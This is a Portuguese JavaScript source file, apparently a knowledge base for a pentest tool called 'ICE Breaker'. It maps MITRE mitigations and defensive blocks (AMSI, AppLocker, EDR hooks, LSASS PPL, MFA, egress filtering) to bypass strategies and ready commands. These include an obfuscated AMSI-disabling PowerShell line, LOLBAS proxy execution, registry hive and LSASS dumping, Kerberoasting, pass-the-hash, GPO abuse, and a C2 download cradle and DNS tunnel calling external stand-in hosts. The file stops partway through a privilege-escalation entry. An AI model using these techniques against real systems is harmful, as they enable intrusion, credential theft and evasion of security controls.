// Base de Conhecimento Tático: ICE Breaker (Motor de Desbloqueio para Pentesters)
// Mapeia Mitigações MITRE (M1xxx), Táticas, Cenários Reais de Bloqueio e Arsenal LOLBAS/GTFOBins

export const MITIGATION_BYPASS_MAP = {
  'M1049': {
    defenseName: "Antivírus e antimalware (AMSI e assinaturas estáticas)",
    blockerSymptom: 'Payload eliminado no disco (Quarantine) ou bloqueado em memória com erro "This script contains malicious content and has been blocked by your antivirus software".',
    bypassStrategyPt: 'Evitar escrita direta em disco (Fileless Execution / Reflective Loading). Em PowerShell/DotNet, aplicar AMSI Memory Patching em `amsi.dll` (`AmsiScanBuffer` ret patch) ou Hardware Breakpoints (VEH2) antes de carregar assemblies via `[System.Reflection.Assembly]::Load()`. Para binários nativos, aplicar cifragem de secções (AES/ChaCha20) com resolução dinâmica de APIs (API Hashing) e Direct/Indirect Syscalls.',
    recommendedTechniques: ['T1027', 'T1620', 'T1562.001', 'T1055', 'T1218']
  },
  'M1038': {
    defenseName: "Prevenção da execução (AppLocker / WDAC / Software Restriction Policies)",
    blockerSymptom: 'Erro "This program is blocked by group policy" ao tentar executar binários em `C:\\Users\\*` ou `C:\\Windows\\Temp`.',
    bypassStrategyPt: 'Enumerar regras de AppLocker em `HKLM\\Software\\Policies\\Microsoft\\Windows\\SrpV2` e localizar diretórios graváveis dentro de `C:\\Windows\\` (ex: `C:\\Windows\\Tasks`, `C:\\Windows\\Temp`, `C:\\Windows\\tracing`, `C:\\Windows\\System32\\spool\\drivers\\color`). Caso haja validação de assinatura/hash (WDAC), utilizar Living-off-the-Land Binaries (LOLBAS) assinados pela Microsoft como `MSBuild.exe` (T1127.001), `InstallUtil.exe` (T1218.004), `Regsvr32.exe` (T1218.010) ou `Certutil.exe`.',
    recommendedTechniques: ['T1218', 'T1127.001', 'T1218.004', 'T1218.010', 'T1218.011', 'T1574.002']
  },
  'M1040': {
    defenseName: "Prevenção comportamental no endpoint (EDR User-Mode Hooking e Kernel Callbacks)",
    blockerSymptom: 'Processo terminado instantaneamente pelo EDR ao tentar `VirtualAllocEx` / `WriteProcessMemory` / `CreateRemoteThread` ou acesso ao `lsass.exe`.',
    bypassStrategyPt: 'Contornar User-Mode Hooks em `ntdll.dll` através de: (1) Indirect Syscalls (ex: Halo\'s Gate / Tartarus\' Gate / SysWhispers3 saltando para a instrução `syscall` dentro da própria `ntdll.dll` para legitimar a Call Stack); (2) Remapeamento de cópia limpa de `ntdll.dll` a partir de `KnownDlls` ou processo suspenso; (3) Uso de Threadless Injection, Module Stomping ou Callback-based Injection em vez de APIs clássicas monitorizadas; (4) Patching de ETW (`EtwEventWrite`) no processo atual.',
    recommendedTechniques: ['T1106', 'T1055.012', 'T1562.001', 'T1620', 'T1574.002']
  },
  'M1043': {
    defenseName: "Proteção do acesso a credenciais (RunAsPPL / Windows Defender Credential Guard)",
    blockerSymptom: 'Erro `0x00000005 (ACCESS_DENIED)` ao tentar fazer dump de `lsass.exe` mesmo com privilégio `SeDebugPrivilege` e `NT AUTHORITY\\SYSTEM`.',
    bypassStrategyPt: 'Com RunAsPPL ativo, processos em User-Mode não conseguem abrir handles `PROCESS_VM_READ` no LSASS. Vetores de contorno: (1) Pivotar para extração sem tocar no LSASS: Kerberoasting (`T1558.003`), AS-REP Roasting (`T1558.004`), ou extração de segredos DPAPI/Vault (`T1555.004`); (2) Se for Domain Admin/equivalente, usar DCSync (`T1003.006`) remotamente; (3) Abusar de drivers assinados vulneráveis (BYOVD - `T1068`) como `mimidrv.sys` ou `procexp152.sys` para remover a flag `PS_PROTECTION` em Kernel-Mode; (4) Se Credential Guard (VBS) estiver ativo, hashes NTLM em cache ficam isolados em `LsaIso.exe` — contornar usando captura de Tickets Kerberos em memória via Rubeus (`monitor`/`tgtdeleg`) ou roubo de cookies de sessão browser.',
    recommendedTechniques: ['T1558.003', 'T1003.006', 'T1555.004', 'T1550.003', 'T1539', 'T1068']
  },
  'M1026': {
    defenseName: "Gestão de contas privilegiadas (LAPS / PAM / Tiering)",
    blockerSymptom: 'Pass-the-Hash com conta de Administrador Local (`RID 500`) falha noutros hosts porque cada máquina possui password única gerida pelo LAPS.',
    bypassStrategyPt: 'Abandonar a tentativa de reutilização horizontal de credenciais locais. Em vez disso: (1) Enumerar quem tem permissão de leitura do atributo `ms-Mcs-AdmPwd` (LAPS v1) ou `msLAPS-Password` / `msLAPS-EncryptedPassword` (Windows LAPS) no Active Directory via LDAP (`T1087.002`); (2) Extrair Tokens ou Tickets Kerberos de utilizadores de domínio com sessão ativa na máquina comprometida (`T1134.001` / `T1550.003`); (3) Explorar delegações Kerberos (Unconstrained / Constrained / RBCD - `T1558`) ou certificados AD CS vulneráveis (ESC1-ESC8 - `T1649`).',
    recommendedTechniques: ['T1649', 'T1550.003', 'T1134.001', 'T1087.002', 'T1558']
  },
  'M1032': {
    defenseName: "Autenticação multifator (MFA / Conditional Access)",
    blockerSymptom: 'Credenciais válidas obtidas, mas o login interativo na VPN/Cloud (Entra ID / Okta) exige segundo fator (TOTP / Push / FIDO2).',
    bypassStrategyPt: 'Vetores de contorno de MFA: (1) Roubo de Session Cookies / PRT (Primary Refresh Token) já autenticados a partir do endpoint da vítima (`T1539` / `T1528`); (2) Adversary-in-the-Middle (AitM) Reverse Proxy Phishing (ex: Evilginx2 - `T1557`) para capturar o token de sessão pós-MFA; (3) Device Code Phishing (`T1528`) ou abuso de Refresh Tokens OAuth; (4) Se o utilizador já tem sessão num host interno, operar por SOCKS proxy através do beacon na estação da vítima (`T1090.001`).',
    recommendedTechniques: ['T1539', 'T1528', 'T1557', 'T1111', 'T1090.001']
  },
  'M1030': {
    defenseName: "Segmentação de rede e firewalls internas (isolamento por VLAN)",
    blockerSymptom: 'Sem conectividade direta da sub-rede atual para servidores de produção ou Domain Controllers.',
    bypassStrategyPt: 'Transformar o host comprometido num pivot multi-homed: (1) Enumerar interfaces de rede secundárias, sessões SSH/RDP ativas e tabelas ARP (`T1016`); (2) Estabelecer túneis SOCKS4a/SOCKS5 ou interface TUN virtual sobre o canal de C2 existente (ex: Ligolo-ng, Chisel - `T1572` / `T1090.001`); (3) Comprometer um Jump Host, servidor de gestão (SCCM, Ansible, vCenter - `T1072`) ou abusar de Internal Spearphishing (`T1534`).',
    recommendedTechniques: ['T1572', 'T1090.001', 'T1072', 'T1021', 'T1534']
  },
  'M1031': {
    defenseName: "Prevenção de intrusões na rede (IDS/IPS, filtragem de saída e inspeção SSL)",
    blockerSymptom: "Reverse shell ou beacon C2 não estabelece ligação para o exterior; ligações TCP diretas bloqueadas ou terminadas pelo Proxy/Firewall.",
    bypassStrategyPt: 'Adaptar o transporte de C2 ao tráfego permitido no ambiente: (1) Respeitar o Proxy Corporativo (WPAD / variáveis de ambiente / WinINet API que usa automaticamente credenciais NTLM/Kerberos do utilizador atual); (2) Usar Domain Fronting ou Web Services legítimos permitidos pela whitelist (GitHub, Microsoft Graph, OneDrive, Slack API - `T1102`); (3) Configurar Malleable C2 Profiles para imitar tráfego HTTPS legítimo e usar certificados TLS válidos com idade/reputação (`T1588.004`); (4) Caso HTTP/HTTPS esteja totalmente isolado, testar DNS Tunneling (`T1071.004`) ou pivotar via SMB Named Pipes (`T1090.001`) através de outro host com saída.',
    recommendedTechniques: ['T1102', 'T1071.001', 'T1071.004', 'T1572', 'T1090.001']
  },
  'M1037': {
    defenseName: "Filtragem do tráfego de rede (bloqueio de SMB 445 / WinRM 5985 / RPC 135)",
    blockerSymptom: 'Movimentação lateral via `PsExec`, `evil-winrm` ou `wmiexec` falha por timeout de porta.',
    bypassStrategyPt: "Procurar protocolos alternativos abertos no host de destino: (1) Se RPC/DCOM alternativo ou portas altas estiverem acessíveis, usar DCOM (`MMC20.Application`, `ShellWindows` - `T1021.003`); (2) Se MSSQL (1433) estiver acessível, usar `xp_cmdshell` ou CLR Assemblies; (3) Se SSH (22) ou RDP (3389) estiverem abertos, usar RestrictedAdmin Mode (`sekurlsa::pth` + `mstsc /restrictedadmin` - `T1021.001`); (4) Abusar de partilhas de ficheiros ou GPOs / SCCM para implementação indireta (`T1072`).",
    recommendedTechniques: ['T1021.003', 'T1021.001', 'T1021.006', 'T1072', 'T1570']
  },
  'M1045': {
    defenseName: "Exigência de assinatura de código (Driver Signature Enforcement / Gatekeeper)",
    blockerSymptom: 'Sistema recusa carregar binário, DLL ou driver não assinado digitalmente.',
    bypassStrategyPt: 'Recorrer a DLL Side-Loading (`T1574.002`) utilizando um executável legítimo assinado (vulnerável a sequestro de ordem de procura de DLL) que carregue a nossa DLL em memória, ou utilizar binários assinados nativos (LOLBAS - `T1218`). Em Kernel-Mode, usar técnica BYOVD (Bring Your Own Vulnerable Driver) com um driver legítimo assinado pela Microsoft/fabricante que contenha primitivas de escrita arbitrária em kernel.',
    recommendedTechniques: ['T1574.002', 'T1218', 'T1553.002', 'T1068']
  },
  'M1042': {
    defenseName: "Desativação ou remoção de funcionalidades ou programas (PowerShell v2 / WScript / macros)",
    blockerSymptom: '`powershell.exe` bloqueado por GPO, ou Macros VBA desativadas por política de Mark-of-the-Web (MotW).',
    bypassStrategyPt: 'Para PowerShell bloqueado: o motor do PowerShell reside em `System.Management.Automation.dll`, não no executável `powershell.exe`. Carregar a DLL diretamente dentro de um binário C# compilado ou via `MSBuild.exe` / `InstallUtil.exe` (Unmanaged PowerShell - `T1059.001` + `T1127.001`). Para bloqueio de Macros Office (MotW): usar contentores `.ISO`/`.VHDX` ou ficheiros `.LNK` / `.WSF` / ClickOnce (`T1553.005`, `T1204.002`).',
    recommendedTechniques: ['T1127.001', 'T1218.004', 'T1553.005', 'T1204.002']
  },
  'M1022': {
    defenseName: "Restrição de permissões de ficheiros e diretórios (ACLs restritas)",
    blockerSymptom: 'Permissão negada ao tentar modificar binários de serviços, chaves de registo ou diretórios de sistema.',
    bypassStrategyPt: 'Auditar permissões efetivas com `AccessChk` / `PowerUp` procurando Unquoted Service Paths (`T1574.009`), Ghost DLL Hijacking (DLLs inexistentes que um serviço `SYSTEM` tenta carregar a partir de pastas no `PATH` onde o utilizador tem escrita - `T1574.001`) ou explorar privilégios de token como `SeBackupPrivilege` / `SeRestorePrivilege` para ignorar ACLs NTFS (`FILE_FLAG_BACKUP_SEMANTICS`).',
    recommendedTechniques: ['T1574.001', 'T1574.009', 'T1134', 'T1222']
  },
  'M1047': {
    defenseName: "Auditoria e correlação de telemetria no SIEM (Sysmon / auditd / ETW)",
    blockerSymptom: "Operações de enumeração ou persistência geram alertas imediatos no SOC devido a regras Sigma sobre argumentos de linha de comandos.",
    bypassStrategyPt: "Aplicar Command-Line Spoofing (criar processo suspenso com argumentos benignos como `svchost.exe -k netsvcs`, alterar `PEB->ProcessParameters->CommandLine` para o comando real e resumir a thread - `T1036.004`), Parent PID Spoofing (`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` - `T1134.004`) e substituir ferramentas de CLI ruidosas (`whoami`, `net user`, `nltest`) por chamadas diretas a APIs Win32/LDAP via BOFs (Beacon Object Files) em memória.",
    recommendedTechniques: ['T1036.004', 'T1134.004', 'T1106', 'T1562.002']
  }
};

export const ICE_BREAKER_SCENARIOS = [
  {
    id: 'blk-amsi-clm',
    title: 'PowerShell Bloqueado: AMSI + Constrained Language Mode (CLM)',
    category: "Execução e evasão",
    severity: 'CRÍTICO',
    defenseMechanism: 'AMSI (Antimalware Scan Interface) + AppLocker/WDAC Constrained Language Mode ($ExecutionContext.SessionState.LanguageMode == "ConstrainedLanguage")',
    symptom: 'Scripts PowerShell como PowerView, Rubeus ou Invoke-Mimikatz são bloqueados com "This script contains malicious content" ou falham ao invocar APIs .NET / Add-Type devido ao CLM.',
    academicContext: 'O AMSI interceta buffers de script em User-Mode através da função exportada `AmsiScanBuffer` em `amsi.dll`, injetada no espaço de endereçamento do processo interpretador. Já o Constrained Language Mode (CLM) restringe a invocação de tipos .NET arbitrários e APIs Win32 quando políticas de Application Control (AppLocker/WDAC) estão ativas.',
    bypassSteps: [
      {
        title: "1. Unmanaged PowerShell por MSBuild / InstallUtil (contorno de CLM e powershell.exe)",
        description: "Executar o runtime `System.Management.Automation.dll` dentro de um binário .NET assinado pela Microsoft (`MSBuild.exe` ou `InstallUtil.exe`), que corre em `FullLanguage` mode por estar na whitelist de diretórios de confiança.",
        command: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\runner.dll',
        mitreIds: ['T1127.001', 'T1218.004', 'T1059.001'],
        opsecRisk: 'BAIXO'
      },
      {
        title: "2. Alteração em memória do contexto AMSI / AmsiScanBuffer",
        description: 'Corromper o contexto de inicialização (`amsiInitFailed`) por reflexão ou alterar os primeiros bytes de `AmsiScanBuffer` na memória do próprio processo (`0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3` -> `E_INVALIDARG`).',
        command: '[Ref].Assembly.GetType("System.Management.Automation."+$("41 6D 73 69 55 74 69 6C 73"-split" "|%{[char]([convert]::ToInt16($_,16))})-join"").GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64"-split" "|%{[char]([convert]::ToInt16($_,16))})-join"","NonPublic,Static").SetValue($null,$true)',
        mitreIds: ['T1562.001', 'T1027'],
        opsecRisk: 'MÉDIO'
      },
      {
        title: "3. Hardware Breakpoints (contorno de AMSI sem patches)",
        description: 'Configurar registos de debug da CPU (`Dr0`-`Dr3`) e um Vectored Exception Handler (VEH) na thread atual para intercetar `AmsiScanBuffer` sem modificar páginas de memória `RX` de `amsi.dll` (evita scanners de integridade de memória de EDRs).',
        command: '// Via BOF / C# Assembly: SetThreadContext(hThread, &ctx) com Dr0 = &AmsiScanBuffer',
        mitreIds: ['T1562.001', 'T1106', 'T1620'],
        opsecRisk: 'STEALTH'
      }
    ],
    lolbasTools: ['MSBuild.exe', 'InstallUtil.exe', 'RegSvcs.exe', 'RegAsm.exe', 'CSI.exe']
  },
  {
    id: 'blk-lsass-ppl',
    title: 'LSASS Bloqueado: RunAsPPL & Credential Guard (Access Denied)',
    category: "Acesso a credenciais",
    severity: 'CRÍTICO',
    defenseMechanism: 'LSA Protection (RunAsPPL - Protected Process Light) + Virtualization-Based Security (Credential Guard / LsaIso.exe)',
    symptom: 'Mesmo como `NT AUTHORITY\\SYSTEM` e com `SeDebugPrivilege` ativo, o Mimikatz (`sekurlsa::logonpasswords`), ProcDump ou `comsvcs.dll` falham com erro `0x00000005 (ACCESS_DENIED)` ao tentar ler a memória do `lsass.exe`.',
    academicContext: 'O mecanismo Protected Process Light (PPL) utiliza um bit no objeto `EPROCESS` do kernel (`Protection` / `SignatureLevel`) que impede qualquer processo não-PPL (mesmo SYSTEM) de obter handles com permissões `PROCESS_VM_READ` ou `PROCESS_DUP_HANDLE`. Já o Credential Guard isola os segredos NTLM e Kerberos num contentor Hyper-V (VTL1 - Virtual Trust Level 1) acessível apenas via RPC pelo processo `LsaIso.exe`.',
    bypassSteps: [
      {
        title: "1. Alternativas com Kerberoasting / AS-REP Roasting / TGT Delegation (sem aceder ao LSASS)",
        description: 'Em vez de tocar no LSASS, interagir com as APIs legítimas SSPI do Windows para extrair tickets Kerberos de contas de serviço ou obter um TGT delegável da sessão atual via `Rubeus.exe tgtdeleg`.',
        command: 'Rubeus.exe tgtdeleg /nowrap\nRubeus.exe kerberoast /rc4opsec /nowrap',
        mitreIds: ['T1558.003', 'T1558.004', 'T1550.003'],
        opsecRisk: 'STEALTH'
      },
      {
        title: "2. Extração de credenciais DPAPI, cookies do navegador e Windows Vault",
        description: 'As MasterKeys DPAPI do utilizador podem ser decifradas pedindo ao Domain Controller via RPC (`lsadump::backupkeys` ou `SharpDPAPI`) sem precisar de ler a memória do LSASS.',
        command: 'SharpDPAPI.exe triage /mkfile:masterkeys.txt\nSharpChrome.exe cookies /unprotect',
        mitreIds: ['T1555.004', 'T1555.003', 'T1539'],
        opsecRisk: 'BAIXO'
      },
      {
        title: "3. Extração local a partir de SAM / SYSTEM / SECURITY (Volume Shadow Copy / registo)",
        description: 'Extrair as hives locais para obter hashes locais, Cached Domain Logons (`DCC2`) e LSA Secrets (contas de serviço configuradas no host).',
        command: 'reg.exe save HKLM\\SAM sam.hiv && reg.exe save HKLM\\SYSTEM sys.hiv && reg.exe save HKLM\\SECURITY sec.hiv',
        mitreIds: ['T1003.002', 'T1003.004', 'T1003.005'],
        opsecRisk: 'MÉDIO'
      },
      {
        title: '4. BYOVD (Bring Your Own Vulnerable Driver) / PPLmedic / WerFaultSecure',
        description: 'Carregar um driver assinado vulnerável (ex: `mimidrv.sys`, `RTCore64.sys`) para zerar os bits de `EPROCESS->Protection` em Kernel-Mode, ou abusar de `WerFaultSecure.exe` (que possui assinatura PPL) para criar um dump do LSASS.',
        command: 'PPLdump.exe lsass.exe lsass.dmp  # ou via PPLFault / WerFaultSecure',
        mitreIds: ['T1068', 'T1003.001', 'T1562.001'],
        opsecRisk: 'ALTO'
      }
    ],
    lolbasTools: ['rundll32.exe (comsvcs.dll)', 'reg.exe', 'esentutl.exe', 'vssadmin.exe', 'WerFaultSecure.exe']
  },
  {
    id: 'blk-edr-hooks',
    title: "EDR a bloquear injeção em processos e shellcode (User-Mode Hooking)",
    category: "Evasão de defesas e furtividade",
    severity: 'CRÍTICO',
    defenseMechanism: 'EDR Inline Hooking em `ntdll.dll` (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) + ETW Threat Intelligence (EtwTi)',
    symptom: 'O processo do agente/loader é morto imediatamente ao tentar injetar shellcode ou executar `VirtualAlloc` + `VirtualProtect` com página `PAGE_EXECUTE_READWRITE (RWX)`.',
    academicContext: 'Os agentes de EDR injetam uma DLL de monitorização em todos os processos User-Mode e sobrescrevem o prólogo das funções `Nt*` em `ntdll.dll` com uma instrução `JMP` para o motor de inspeção do EDR antes da transição para o Kernel (Ring 0). Além disso, alocações `RWX` ou chamadas a `syscall` originadas fora do intervalo de memória de `ntdll.dll` são detetadas por verificação da Call Stack.',
    bypassSteps: [
      {
        title: '1. Indirect Syscalls + Call Stack Spoofing (Halo\'s Gate / Tartarus\' Gate)',
        description: 'Resolver dinamicamente o System Service Number (SSN) lendo a tabela de exportação de `ntdll.dll`, preparar os registos e saltar (`JMP`) para o endereço da instrução `syscall; ret` situada dentro da própria `ntdll.dll`, mantendo `RIP` legítimo.',
        command: '// Em C/ASM (SysWhispers3 / RecycleGate): jmp qword ptr [pSyscallInstructionInNtdll]',
        mitreIds: ['T1106', 'T1055', 'T1620'],
        opsecRisk: 'STEALTH'
      },
      {
        title: "2. Unhooking com uma cópia limpa de KnownDlls ou de um processo suspenso",
        description: 'Mapear uma secção `.text` limpa de `\\KnownDlls\\ntdll.dll` e sobrescrever a secção `.text` da `ntdll.dll` atual para remover todos os inline hooks em User-Mode.',
        command: '// MapViewOfSection(\\KnownDlls\\ntdll.dll) -> memcpy(.text_local, .text_clean)',
        mitreIds: ['T1562.001', 'T1055'],
        opsecRisk: 'BAIXO'
      },
      {
        title: "3. Threadless Injection / Callback Injection e prevenção de memória RWX",
        description: 'Alocar memória apenas como `RW`, copiar o payload, alterar para `RX` (`VirtualProtect`), e acionar a execução através de Windows Callbacks (`EnumChildWindows`, `CreateTimerQueueTimer`, `FlsAlloc`) ou Thread Pool (`TpAllocWork`) em vez de `CreateRemoteThread`.',
        command: '// Alocação RW -> Write -> Protect RX -> EnumWindows((WNDENUMPROC)pPayload, 0)',
        mitreIds: ['T1055.012', 'T1055.004', 'T1106'],
        opsecRisk: 'STEALTH'
      }
    ],
    lolbasTools: ['mavinject.exe', 'odbcconf.exe', 'rundll32.exe']
  },
  {
    id: 'blk-applocker-wdac',
    title: "AppLocker / WDAC a bloquear a execução de binários (.EXE / .DLL / .PS1)",
    category: "Execução e evasão",
    severity: 'ALTO',
    defenseMechanism: 'Application Control (AppLocker / Windows Defender Application Control - WDAC)',
    symptom: 'Qualquer tentativa de correr ferramentas (Chisel, Mimikatz, SharpHound, nc.exe) resulta em "This program is blocked by group policy".',
    academicContext: "Políticas de Application Whitelisting bloqueiam a criação de processos (`NtCreateUserProcess`) ou o carregamento de imagens (`SEC_IMAGE`) que não residam em caminhos de confiança (`C:\\Program Files`, `C:\\Windows`) ou que não possuam assinatura digital de um Publisher autorizado.",
    bypassSteps: [
      {
        title: '1. Abuso de Binários Assinados da Microsoft (LOLBAS Proxy Execution)',
        description: 'Compilar o payload como uma classe C# que herda de `Microsoft.Build.Utilities.Task` (para `MSBuild.exe`) ou `[System.ComponentModel.RunInstaller(true)]` (para `InstallUtil.exe`). O código corre dentro de um binário nativo assinado pela Microsoft.',
        command: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Windows\\Tasks\\payload.csproj',
        mitreIds: ['T1127.001', 'T1218.004', 'T1218.010', 'T1218.011'],
        opsecRisk: 'BAIXO'
      },
      {
        title: '2. Execução a partir de Diretórios Graváveis dentro de C:\\Windows',
        description: 'Regras padrão do AppLocker confiam em `C:\\Windows\\*`. Diretórios como `C:\\Windows\\Tasks`, `C:\\Windows\\Temp`, `C:\\Windows\\Registration\\CRMLog` e `C:\\Windows\\System32\\spool\\drivers\\color` permitem escrita por utilizadores standard.',
        command: 'icacls C:\\Windows\\Tasks\ncopy tool.exe C:\\Windows\\Tasks\\svchost_helper.exe && C:\\Windows\\Tasks\\svchost_helper.exe',
        mitreIds: ['T1036.005', 'T1218'],
        opsecRisk: 'MÉDIO'
      },
      {
        title: '3. DLL Side-Loading em Aplicações Assinadas de Terceiros',
        description: 'Copiar um executável legítimo assinado (ex: binário de fornecedor presente no sistema ou OneDrive/Teams updater) para uma pasta gravável junto com uma DLL proxy maliciosa que exporte as mesmas funções.',
        command: '// Copiar LegitSignedApp.exe + version.dll (Proxy DLL) para a mesma pasta e executar',
        mitreIds: ['T1574.002', 'T1574.001'],
        opsecRisk: 'STEALTH'
      }
    ],
    lolbasTools: ['MSBuild.exe', 'InstallUtil.exe', 'Regsvr32.exe', 'Rundll32.exe', 'Certutil.exe', 'Hh.exe']
  },
  {
    id: 'blk-lateral-smb-winrm',
    title: 'Movimentação Lateral Bloqueada: SMB (445) / WinRM (5985) / PsExec Falham',
    category: "Movimentação lateral",
    severity: 'ALTO',
    defenseMechanism: 'Firewall Host-based, Bloqueio de Admin Shares (`ADMIN$`, `C$`), SMB Signing Enforcement ou Serviço WinRM Desativado',
    symptom: 'Tens credenciais de Administrador / Hash NTLM / Ticket Kerberos para o servidor alvo, mas `psexec.py`, `smbexec.py` ou `evil-winrm` dão timeout ou erro de acesso.',
    academicContext: 'Muitas organizações desativam o WinRM por defeito em estações de trabalho, bloqueiam a criação de serviços remotos via SCM (`svcctl`) pelo EDR, ou filtram a porta 445 entre segmentos.',
    bypassSteps: [
      {
        title: '1. Execução Remota via DCOM (Distributed Component Object Model)',
        description: 'Instanciar objetos COM remotamente sobre RPC (porta 135 + portas altas dinâmicas) usando `MMC20.Application`, `ShellWindows` ou `ShellBrowserWindow`, sem criar serviços (`Event ID 7045`) nem usar WinRM.',
        command: 'impacket-dcomexec -object MMC20 -hashes :NTLMHASH dominio.local/admin@10.10.20.50 "cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt"',
        mitreIds: ['T1021.003', 'T1550.002'],
        opsecRisk: 'BAIXO'
      },
      {
        title: '2. Execução via WMI / Task Scheduler Remoto (atexec / schtasks)',
        description: 'Utilizar WMI (`Win32_Process::Create`) ou registar uma Scheduled Task temporária via RPC (`TSCH`) que executa como `SYSTEM` e se auto-remove.',
        command: 'impacket-wmiexec -k -no-pass dominio.local/admin@srv-alvo.dominio.local\nimpacket-atexec -hashes :NTLMHASH dominio.local/admin@10.10.20.50 "whoami"',
        mitreIds: ['T1047', 'T1053.005'],
        opsecRisk: 'MÉDIO'
      },
      {
        title: '3. RDP com RestrictedAdmin Mode (Pass-the-Hash sobre Porta 3389)',
        description: 'Quando apenas a porta 3389 (RDP) está aberta na firewall, usar `RestrictedAdmin` para autenticar com o Hash NTLM ou Ticket Kerberos sem conhecer a password em plaintext.',
        command: 'xfreerdp /v:10.10.20.50 /u:Administrator /pth:NTLMHASH /cert:ignore',
        mitreIds: ['T1021.001', 'T1550.002'],
        opsecRisk: 'BAIXO'
      },
      {
        title: '4. Sequestro de SCCM / GPO / Startup Script ou MSSQL Link',
        description: 'Se nenhuma porta de gestão direta estiver aberta, procurar se o servidor faz parte de uma OU com GPO editável (`SharpGPOAbuse`), coleção SCCM (`SharpSCCM`) ou possui porta 1433 (MSSQL) aberta.',
        command: 'SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\\SYSTEM" --Command "cmd.exe" --Arguments "/c ..." --GPOName "ServerPolicy"',
        mitreIds: ['T1484.001', 'T1072'],
        opsecRisk: 'STEALTH'
      }
    ],
    lolbasTools: ['wmic.exe', 'schtasks.exe', 'sc.exe', 'winrs.exe', 'mstsc.exe']
  },
  {
    id: 'blk-protected-users-ntlm',
    title: 'Pass-the-Hash Falha: Grupo "Protected Users" ou NTLM Desativado',
    category: "Acesso a credenciais e Active Directory",
    severity: 'ALTO',
    defenseMechanism: 'Active Directory "Protected Users" Security Group + Restrição de NTLM (`RestrictReceivingNTLMTraffic`)',
    symptom: 'Conseguiste o hash NTLM de um Domain Admin, mas o Pass-the-Hash (`pth`) falha com `STATUS_ACCOUNT_RESTRICTION` ou `KDC_ERR_ETYPE_NOSUPP`.',
    academicContext: 'Contas membros do grupo `Protected Users` não podem autenticar via NTLM, não permitem cifragem RC4/DES no Kerberos (exigindo AES128/AES256) e os seus TGTs têm tempo de vida reduzido (4 horas) sem delegação irrestrita.',
    bypassSteps: [
      {
        title: '1. Overpass-the-Hash / Pass-the-Key com Chaves Kerberos AES256',
        description: 'Em vez de usar o hash NTLM (que equivale a RC4-HMAC), extrair a chave `aes256-cts-hmac-sha1-96` da conta ou calculá-la a partir da password + salt (`DOMAINuppercase + username`) e solicitar um TGT legítimo.',
        command: 'Rubeus.exe asktgt /user:admin_da /aes256:CHAVE_AES256_HEX /opsec /ptt\nimpacket-getTGT -aesKey CHAVE_AES256_HEX dominio.local/admin_da',
        mitreIds: ['T1550.002', 'T1550.003'],
        opsecRisk: 'STEALTH'
      },
      {
        title: '2. Roubo de TGT já existente em Memória ou Abuso de AD CS (Certificados PKINIT)',
        description: 'Extrair o TGT Kerberos já emitido para o utilizador na máquina onde ele tem sessão ativa (`Rubeus dump`), ou emitir um certificado cliente via Active Directory Certificate Services (ESC1/Shadow Credentials) e autenticar via PKINIT.',
        command: 'certipy auth -pfx admin_da.pfx -dc-ip 10.10.10.5',
        mitreIds: ['T1649', 'T1550.003', 'T1556.006'],
        opsecRisk: 'STEALTH'
      }
    ],
    lolbasTools: ['klist.exe', 'certreq.exe', 'certutil.exe']
  },
  {
    id: 'blk-egress-firewall',
    title: "Sem reverse shell: firewall a bloquear tráfego de saída (apenas proxy / DNS)",
    category: 'Command and Control (C2)',
    severity: 'ALTO',
    defenseMechanism: 'Egress Filtering Restrito + Proxy Corporativo Autenticado (Squid / BlueCoat / Zscaler) com TLS Inspection',
    symptom: 'Conseguiste RCE num servidor interno, mas `nc`, `curl` direto ou reverse shell TCP para a tua VPS externa na porta 443/8080 sofre timeout.',
    academicContext: 'Redes corporativas maduras bloqueiam tráfego direto da rede interna para a Internet (Direct-to-Net block), forçando todo o tráfego web a passar por um Proxy explícito autenticado via Kerberos/NTLM e bloqueando domínios não categorizados.',
    bypassSteps: [
      {
        title: "1. C2 compatível com proxy através de WinHTTP / WinINet (autenticação transparente)",
        description: 'Configurar o agente C2 para utilizar a stack nativa `WinINet` / `WinHTTP` do Windows no contexto do utilizador logado; o próprio SO descobre o proxy via WPAD/Registry e autentica automaticamente no Proxy com o ticket Kerberos do utilizador.',
        command: 'powershell -c "$wc=New-Object System.Net.WebClient; $wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy; $wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials; $wc.DownloadString(\'https://c2-categorizado.com/init\')"',
        mitreIds: ['T1071.001', 'T1090'],
        opsecRisk: 'STEALTH'
      },
      {
        title: "2. C2 através de serviços web legítimos (GitHub / Microsoft Graph / Slack / OneDrive)",
        description: 'Se o Proxy bloquear domínios desconhecidos, utilizar um canal C2 que comunique exclusivamente com `api.github.com`, `graph.microsoft.com` ou `slack.com` (que possuem whitelist corporativa e pinning TLS).',
        command: '// Configurar External C2 / Mythic / Sliver HTTP C2 sobre API Microsoft Graph ou GitHub Issues',
        mitreIds: ['T1102.002', 'T1071.001'],
        opsecRisk: 'STEALTH'
      },
      {
        title: '3. DNS Tunneling Autoritativo ou Pivot SMB Named Pipe (P2P)',
        description: 'Se o servidor for totalmente isolado da Internet (Air-Gapped VLAN), testar se o DNS interno resolve domínios externos recursivamente (`nslookup sub.teuc2.com`) para DNS C2 (`dnscat2`/`sliver-dns`), ou ligar o agente por SMB Named Pipe (`\\\\host-com-internet\\pipe\\msagent_12`) a outra máquina comprometida que tenha saída.',
        command: 'nslookup -type=TXT stage1.ns1.dominio-c2.com\n// Ou Pivot SMB: link host_isolado pipe_name',
        mitreIds: ['T1071.004', 'T1090.001', 'T1572'],
        opsecRisk: 'BAIXO'
      }
    ],
    lolbasTools: ['nslookup.exe', 'bitsadmin.exe', 'curl.exe', 'certutil.exe']
  },
  {
    id: 'blk-uac-privesc',
    title: "Bloqueado em Medium Integrity: administrador local com elevação impedida pelo UAC",
    category: "Escalada de privilégios",
    severity: 'MÉDIO',
    defenseMechanism: 'User Account Control (UAC Split Token) + `FilterAdministratorToken`',
